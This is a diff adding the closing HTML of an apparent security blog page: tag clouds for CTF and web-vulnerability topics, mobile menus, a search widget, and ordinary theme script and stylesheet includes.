+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/linux/" style="font-size: 13.33px;">linux</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web漏洞/" style="font-size: 16.67px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/linux/" style="font-size: 13.33px;">linux</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web漏洞/" style="font-size: 16.67px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
